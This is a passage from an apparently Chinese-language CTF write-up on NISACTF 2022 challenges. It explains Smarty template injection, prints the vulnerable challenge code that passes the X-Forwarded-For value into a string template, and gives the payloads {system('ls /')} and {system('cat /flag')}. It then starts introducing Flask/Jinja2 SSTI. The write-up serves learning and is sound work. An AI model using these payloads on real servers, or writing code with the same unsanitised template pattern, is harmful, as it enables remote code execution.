+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Smarty_Template_Compiled.compileTemplateSource</span><br><span class="line">//创建</span><br><span class="line">Smarty_Template_Compiled.loadCompiledTemplate</span><br><span class="line">//创建完成之后加载调用</span><br></pre></td></tr></table></div></figure>
+
+<p>下面分析更多</p>
+<p>调用到<code>Smarty_Template_Compiled.compileTemplateSource</code>函数，然后在<code>write</code>函数中</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164052011.png" alt="image-20230111164052011"></p>
+<p>回调到<code>Smarty_Internal_TemplateCompilerBase.compileTemplate</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164116060.png" alt="image-20230111164116060"></p>
+<p>里面调用<code>create</code>函数再回调到<code>Smarty_Internal_TemplateCompilerBase.compileTemplateSource</code>函数</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164320942.png" alt="image-20230111164320942"></p>
+<p>该函数最终会调用<code>getContent</code>函数，依据不同的<code>handler</code>调用到不同类的处理函数中，比如<code>string</code>对应的类就是<code>Smarty_Internal_Resource_String</code>，会调用到其<code>decode</code>函数进行相关内容处理</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164515198.png" alt="image-20230111164515198"></p>
+<p>比如这里的这里提到的例子里面的<code>string</code>就是<code>&#123;phpinfo()&#125;</code>，相关处理后就直接返回内容，然后在后续的操作中，将该内容连同一些数据写入到指定的<code>templates_c</code>文件夹中<code>hash</code>之后的一个<code>php</code>文件，这里就会如下结果</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Smarty version 4.3.0, created on 2023-01-11 16:48:16</span></span><br><span class="line"><span class="comment">  from &#x27;ce7370c7e6956f1e6a18ad78cf4f6e48dabb61b3&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> Smarty_Internal_Template $_smarty_tpl */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_smarty_tpl</span>-&gt;_decodeProperties(<span class="variable">$_smarty_tpl</span>, <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;version&#x27;</span> =&gt; <span class="string">&#x27;4.3.0&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;unifunc&#x27;</span> =&gt; <span class="string">&#x27;content_63be77d0cad990_36655883&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;has_nocache_code&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&#x27;file_dependency&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">  ),</span><br><span class="line">  <span class="string">&#x27;includes&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">  ),</span><br><span class="line">),<span class="literal">false</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">content_63be77d0cad990_36655883</span> (<span class="params">Smarty_Internal_Template <span class="variable">$_smarty_tpl</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>然后在后续的<code>Smarty_Template_Compiled.loadCompiledTemplate</code>中会对该文件进行包含，执行其中的<code>php</code>代码，这里可能是因为<code>smarty</code>一些机制原因，必定在包含的时候能够执行到里面对应的那个函数。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111165045717.png" alt="image-20230111165045717"></p>
+
+        <h3 id="模板调用"   >
+          <a href="#模板调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#模板调用" class="headerlink" title="模板调用"></a>模板调用</h3>
+      <p>当存在该模板，也就是<code>string:&#123;phpinfo()&#125;</code>对应的模板，就会在<code>Smarty_Template_Compiled.process</code>函数中，也就是如下红框中，直接进行对应的模板文件包含，同样也是可以执行代码的。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111171930724.png" alt="image-20230111171930724"></p>
+
+        <h3 id="其他类模板"   >
+          <a href="#其他类模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他类模板" class="headerlink" title="其他类模板"></a>其他类模板</h3>
+      <p>前面提到的是<code>string</code>类的模板，同样也可能会有自定义的，比如如下</p>
+<p>参考：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" >CVE-2017-1000480]Smarty &lt;= 3.1.32 php代码执行 漏洞分析 | Chybeta</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$name</span>,&amp;<span class="variable">$source</span>,&amp;<span class="variable">$mtime</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$source</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$mtime</span> = time();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;test:&#123;phpinfo()&#125;&quot;</span>);</span><br></pre></td></tr></table></div></figure>
+
+<p>这里的<code>$name</code>就是对应的<code>&#123;phpinfo()&#125;</code>，将其赋值给<code>$source</code>从而在后续的<code>smarty</code>处理中形成对应的<code>content</code>，因为在<code>write</code>过程中之前提到会有<code>getContent</code>的调用，使用自定义类<code>Smarty_Resource_Custom</code>就会调用到该类的<code>fetch</code>函数，传入的<code>source</code>就是<code>content</code>，从而为<code>content</code>赋值。</p>
+
+        <h2 id="漏洞形式"   >
+          <a href="#漏洞形式" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h2>
+      <p>常见的漏洞形式如下</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span>.<span class="variable">$data</span>);</span><br></pre></td></tr></table></div></figure>
+
+<p>这样<code>data</code>就是可控的，那么相关的代码执行就是水到渠成了。</p>
+
+        <h2 id="题目"   >
+          <a href="#题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目" class="headerlink" title="题目"></a>题目</h2>
+      <p>相对于这道题就可以猜测了，大概就是会接收我们的<code>ip</code>，然后和它的模板进行拼接然后输出，其实测试一下就可以了。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111174624907.png" alt="image-20230111174624907"></p>
+<p>很明显，可以代码执行，即可完成</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&#x27;ls /&#x27;)&#125;</span><br><span class="line">&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>具体看看代码，放个木马上去下载一下</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;smarty/libs/Smarty.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;debugging = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;caching = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;assign(<span class="string">&#x27;foo&#x27;</span>,<span class="string">&#x27;value&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]))&#123;</span><br><span class="line">           <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>])) &#123;</span><br><span class="line">           <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>))&#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv( <span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(getenv(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>)) &#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$template_string</span> = <span class="string">&#x27;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;A Simple IP Address API&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;float:left;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;IP&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h2 class=&quot;hidden-xs hidden-sm&quot;&gt;A Simple Public IP Address API&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">		&lt;div style=&quot;float:right;margin-top:30px;&quot;&gt;Current IP:&#x27;</span>.<span class="variable">$real_ip</span>.<span class="string">&#x27;		&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;why row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Why use?&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;</span></span><br><span class="line"><span class="string">                        Do you need to get the public IP address ? Do you have the requirements to obtain the servers’ public IP address? Whatever the reason,sometimes a public IP address API are useful.</span></span><br><span class="line"><span class="string">                    &lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;</span></span><br><span class="line"><span class="string">                        You should use this because:</span></span><br><span class="line"><span class="string">                    &lt;/p&gt;&lt;ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;You can initiate requests without any limit.&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;li&gt;Does not record the visitor information.&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;api row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;API Usage&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-11&quot;&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;table-responsive&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;table class=&quot;table table-striped table-bordered table-hover&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;thead&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;-&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;API URI&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td width=&quot;50px&quot;&gt;Type&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;Sample Output&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;/thead&gt;</span></span><br><span class="line"><span class="string">                            &lt;tbody&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;get IP&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>].<span class="string">&#x27;api&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;text/html&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;8.8.8.8&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;get XFF(X-Forwarded-For)&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>].<span class="string">&#x27;xff&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;text/html&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;8.8.8.8&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            </span></span><br><span class="line"><span class="string">                            </span></span><br><span class="line"><span class="string">                            &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">                        &lt;/table&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;examples row&quot;&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2 style=&quot;margin-bottom:0;&quot;&gt;Connection&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h3&gt;Request-Header&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                    &lt;pre&gt;GET / HTTP/2.0</span></span><br><span class="line"><span class="string">Host: www.ip.la</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Dnt: 1</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;footer&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;text-align:center;font-size:14px;&quot;&gt;Build With Smarty !&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/footer&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;string:&#x27;</span>.<span class="variable">$template_string</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>可以看到<code>$template_string</code>中包含了我们可以控制的<code>$real_ip</code></p>
+
+        <h1 id="NISACTF-2022-midlevel"   >
+          <a href="#NISACTF-2022-midlevel" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-midlevel" class="headerlink" title="[NISACTF 2022]midlevel"></a>[NISACTF 2022]midlevel</h1>
+      <p>和上一道题一模一样，不太懂意义在哪里</p>
+
+        <h1 id="NISACTF-2022-is-secret"   >
+          <a href="#NISACTF-2022-is-secret" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-is-secret" class="headerlink" title="[NISACTF 2022]is secret"></a>[NISACTF 2022]is secret</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155550917.png" alt="image-20230112155550917"></p>
+<p>试试输入<code>secret</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155613805.png" alt="image-20230112155613805"></p>
+<p>看来还得输入参数</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155641182.png" alt="image-20230112155641182"></p>
+<p>随便输点，发现报错了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155719927.png" alt="image-20230112155719927"></p>
+<p>依据报错信息可以判断用的是<code>python2</code>下<code>flask</code>，报错信息中有比较关键的部分</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line">a=render_template_string(safe(deS))</span><br></pre></td></tr></table></div></figure>
+
+<p>这个函数<code>render_template_string</code>通常和<code>SSTI</code>模板注入有关，和之前的<code>php</code>中的相关模板注入有点类似，而且在火狐浏览器中居然可以点开查看代码，在<code>edge</code>和<code>chrome</code>都不行</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112161329622.png" alt="image-20230112161329622"></p>
+<p>可以看到，那个<code>secret</code>应该是我们控制的，因为没有<code>secret</code>的时候，确实输出了那个文字，有了就会输出其他的。</p>
+<p>中间看代码，将输入的<code>secret</code>通过<code>rc4</code>进行解密，那个<code>HereIsTreasure</code>应该就是密钥，然后字节放入<code>render_template_string</code>函数中，那么就肯定存在<code>SSTI</code>模板注入</p>
+
+        <h2 id="前置知识-2"   >
+          <a href="#前置知识-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2>
+      <p>了解<code>flask</code>的<code>SSTI</code>还是需要一些前置知识的，如下代码示例</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;&#x27;abc&#x27;.__class__&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>
+
+<p>当访问<code>ip:port/test</code>时，出现如下情况</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162026870.png" alt="image-20230112162026870"></p>
+<p>返回了一个类名字，这个其实就相当于在<code>python</code>里面执行了<code>&#39;abc&#39;.__class__</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162115798.png" alt="image-20230112162115798"></p>
+<p>那么对应的，这个标签<code>&#123;&#123;xxx&#125;&#125;</code>，修改里面的<code>xxx</code>，即可获得任意<code>python</code>代码执行的能力。但是这里的代码执行和正常的<code>python</code>还是有点区别的，比如如下</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;print(&#x27;aaaa&#x27;)&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>
+
+<p>就会出现如下情况</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162739395.png" alt="image-20230112162739395"></p>
+<p>原因就在于使用的模板引擎是<code>jinja2</code>，它有自己的一套规则，基本的语法如下</p>
+<ul>
+<li>控制结构 <code>&#123;% %&#125;</code></li>
+<li>变量取值 <code>&#123;&#123; &#125;&#125;</code></li>
+<li>注释 <code>&#123;# #&#125;</code></li>
+</ul>
+<p>那么将刚刚的示例修改一下</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;% for i in range(3) %&#125;&quot;</span> \</span><br><span class="line">               <span class="string">&quot;&#123;&#123;i&#125;&#125;&quot;</span> \</span><br><span class="line">               <span class="string">&quot;&#123;% endfor %&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>
+
+<p>访问之后效果如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112163519711.png" alt="image-20230112163519711"></p>
+<p>可以看到相当于执行了对应的<code>jinja2</code>代码，那么针对<code>flask</code>的<code>SSTI</code>模板注入，其实质就是执行<code>jinja2</code>代码。</p>
+<p>而相对于<code>jinja2</code>代码执行，用的最多的就是变量<code>&#123;&#123;i&#125;&#125;</code>取值，利用变量取值就可以获取到<code>python</code>里面各式各样的类和其中对应的方法，那么传入相关参数就能调用到相关的<code>python</code>代码了呀。</p>
+<p>比如最开始的<code>&#39;abc&#39;.__class__</code>，可以通过它来获取到基类<code>object</code>然后获取到后面的对应所有需要的类</p>
